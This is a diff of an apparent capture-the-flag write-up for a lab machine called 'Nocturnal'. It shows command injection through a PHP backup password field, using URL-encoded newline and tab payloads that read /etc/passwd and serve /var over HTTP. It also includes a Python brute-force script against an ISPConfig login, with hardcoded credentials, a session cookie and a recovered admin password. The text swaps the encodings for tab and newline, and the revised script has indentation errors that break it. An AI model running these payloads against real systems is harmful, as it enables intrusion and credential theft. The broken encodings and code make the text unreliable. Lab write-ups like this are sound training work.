@@ -147,16 +147,20 @@ if ($password === false) {
     sleep(2);
 ```
 ####
-The entry is the passowrd `$password = cleanEntry($_POST['password']);`, so we can try to inject a malicious code into this entry because more under is this `$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";`. The backup is performed using a command into the target machine. The password entry is insert into the command as **param**, so in Linux you can inject other command inserting a `;` character: `cat user.txt; ls -la`.
+The entry is the passowrd `$password = cleanEntry($_POST['password']);`, so we can try to inject a malicious code into this entry because more under is this:
 ####
-Following this approach, we need to achieve execute commands into the target machine.
+```ruby
+$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
+```
+####
+The backup is performed using a command into the target machine. The password entry is insert into the command as **param**, so in Linux you can inject other command inserting a `;` character. Following this approach, we need to achieve execute commands into the target machine.
 ####
 <div class="img">
     <img src="/machines/public/nocturnal/5.png" loading="lazy" decoding="async" />
 </div>
 
 ####
-How the web site deleted the `;` and ` `, the execute additional command is imposible so far. But we could try to discover which other character comply with this approaching. I found other focus, to sustitute the ` ` we can use a **tab** `    `, this in **url-encode** is `%0A`, and for sustitute `;` we can use a **jump-line**, this in **url-encode** is `%09`.
+How the web site deleted the `;` and **spaces**, the execute additional command is imposible so far. But we could try to discover which other character comply with this approaching. I found other focus, to sustitute the **spaces** we can use a **tab**, this in **url-encode** is `%0A`, and for sustitute `;` we can use a **jump-line**, this in **url-encode** is `%09`.
 ####
 | Characteres Param | Description |
 | ----- | ----- |
@@ -173,7 +177,13 @@ cat[tab]/etc/passwd
 ;cat /etc/passwd;
 ```
 ####
-In `view.php` file we can se a `.db` file path `$db = new SQLite3('../nocturnal_database/nocturnal_database.db');`. But we don't now what is the complete path. So now we are able to execute commands in the target machine. Almost always the web services are hosted in `/var/www`, so we could try to expose that path in *HTTP* port to make *Directory Listing*.
+In `view.php` file, we can se a `.db` file path:
+####
+```ruby
+$db = new SQLite3('../nocturnal_database/nocturnal_database.db');
+```
+####
+But we don't now what is the complete path. So now we are able to execute commands in the target machine. Almost always the web services are hosted in `/var/www`, so we could try to expose that path in *HTTP* port to make *Directory Listing*.
 ####
 ```ruby
 [jump]
@@ -184,7 +194,11 @@ python3[tab]-m[tab]http.server[tab]
 ;cd /var;python -m http.server;
 ```
 ####
-The correct field password: `password=%0Acd%09/var%0Apython3%09-m%09http.server%0A&backup=`.
+The correct field password:
+####
+```ruby
+password=%0Acd%09/var%0Apython3%09-m%09http.server%0A&backup=
+```
 ####
 <div class="img">
     <img src="/machines/public/nocturnal/6.png" loading="lazy" decoding="async" />
@@ -257,12 +271,12 @@ Like **tobias** user into the target machine we search files or binaries with *S
 ```ruby
 netstat -a
     Result ->
-        Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
-        tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
-        tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN     
-        tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN     
-        tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN     
-        tcp        0      0 localhost:submission    0.0.0.0:*               LISTEN     
+        Proto Recv-Q Send-Q Local Address           Foreign Address         State
+        tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
+        tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN
+        tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN
+        tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN
+        tcp        0      0 localhost:submission    0.0.0.0:*               LISTEN
         tcp        0      0 localhost:http-alt      0.0.0.0:*               LISTEN     
         tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN     
         tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
@@ -303,52 +317,51 @@ from time import sleep
 from pwn import log
 
 def main():
-	url = 'http://localhost:8080/login'
+    url = 'http://localhost:8080/login'
 
-	users = [
-		"admin",
-		"amanda",
-		"tobias",
-		"kavi",
-		"e0Al5",
-		"det0xgravity",
-		"dario"
-	]
+    users = [
+    	"admin",
+    	"amanda",
+    	"tobias",
+    	"kavi",
+    	"e0Al5",
+    	"det0xgravity",
+    	"dario"
+    ]
 
-	passwords = [
-		"slowmotionapocalypse",
-		"admin",
-		"test123",
-		"dario",
-		"arHkG7HAI68X8s1J"
-	]
+    passwords = [
+    	"slowmotionapocalypse",
+    	"admin",
+    	"test123",
+    	"dario",
+    	"arHkG7HAI68X8s1J"
+    ]
 
-	cookies = {
-		"ISPCSESS" : "2skbde830c1d3um1gnh1mtv1gl"
-	}
+    cookies = {
+    	"ISPCSESS" : "2skbde830c1d3um1gnh1mtv1gl"
+    }
+    
+    bar = log.progress("Brute force attack...")
 
-	bar = log.progress("Brute force attack...")
+    for user in users:
+    	for password in passwords:
+            data = {
+                "username" : user,
+                "password" : password,
+                "s_mod" : "login",
+                "s_pg" : "index"
+            }           
+            try:
+                bar.status(f"Trying {user}:{password} credential")
+                response = requests.post(url=url, cookies=cookies, data=data, timeout=5, allow_redirects=False)
+                if response.status_code == 302:
+                    print()
+                    log.success(f"{user}:{password} are valid")
+            except: pass
+                sleep(5)
 
-	for user in users:
-		for password in passwords:
-			data = {
-				"username" : user,
-				"password" : password,
-				"s_mod" : "login",
-				"s_pg" : "index"
-			}
-
-			try:
-				bar.status(f"Trying {user}:{password} credential")
-				response = requests.post(url=url, cookies=cookies, data=data, timeout=5, allow_redirects=False)
-				if response.status_code == 302:
-					print()
-					log.success(f"{user}:{password} are valid")
-			except: pass
-
-			sleep(5)
 if __name__ == '__main__':
-	main()
+    main()
 ```
 ####
 This was possible because we intercept a authentication attempt login and we can get the data format and the cookie. So with this data now is possible to craft a custom script, after execute the script a valid credential was reported `admin:slowmotionapocalypse are valid`. Navigating into the dashboard we discovered a version *ISP Config 3.2.1*.
